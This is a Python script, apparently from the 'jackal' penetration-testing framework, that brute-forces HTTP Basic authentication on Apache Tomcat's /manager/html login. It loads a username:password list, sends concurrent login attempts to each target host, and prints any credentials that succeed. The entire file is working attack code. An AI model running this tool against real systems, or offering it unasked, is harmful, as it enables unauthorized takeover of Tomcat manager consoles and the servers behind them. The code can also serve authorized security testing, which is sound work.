#!/usr/bin/env python3
import base64
import sys
import grequests
import gevent
from jackal import Core
from jackal.utils import print_success, print_notification, print_error
from builtins import input


def brutefore_passwords(ip, url, credentials):
    """
        Bruteforce function, will try all the credentials at the same time, splits the given credentials at a ':'.
    """
    auth_requests = []
    for credential in credentials:
        split = credential.strip().split(':')
        username = split[0]
        password = ''
        if len(split) > 1:
            password = split[1]
        auth_requests.append(grequests.get(url, auth=(username, password)))
    results = grequests.map(auth_requests)
    for result in results:
        if result.status_code == 200:
            creds = result.request.headers['Authorization'].split(' ')[1]
            creds = base64.b64decode(creds).decode('utf-8')
            creds = creds.split(':')
            print_success("Found a password for tomcat: {0}:{1} at ip: {2}".format(
                creds[0], creds[1], ip))


def main():
    """
        Checks the arguments to brutefore and spawns greenlets to perform the bruteforcing.
    """
    core = Core()
    if not core.arguments.ports:
        print_error("Please provide at least one port")
        sys.exit()

    if not core.arguments.file:
        print_error("Please provide a file with credentials seperated by ':'")
        sys.exit()

    hosts = core.get_hosts()
    if len(hosts) == 1:
        print_notification("Scanning {} host".format(len(hosts)))
    else:
        print_notification("Scanning {} hosts".format(len(hosts)))

    port = core.arguments.ports
    if len(core.arguments.ports.split(',')) > 1:
        port = int(input("What port do you want to bruteforce [{}]? ".format(core.arguments.ports)))
    else:
        port = int(port)

    credentials = []
    with open(core.arguments.file, 'r') as f:
        credentials = f.readlines()

    for host in hosts:
        url = 'http://{}:{}/manager/html'
        gevent.spawn(brutefore_passwords, host.address, url.format(host.address, port), credentials)

    gevent.wait()


if __name__ == '__main__':
    main()
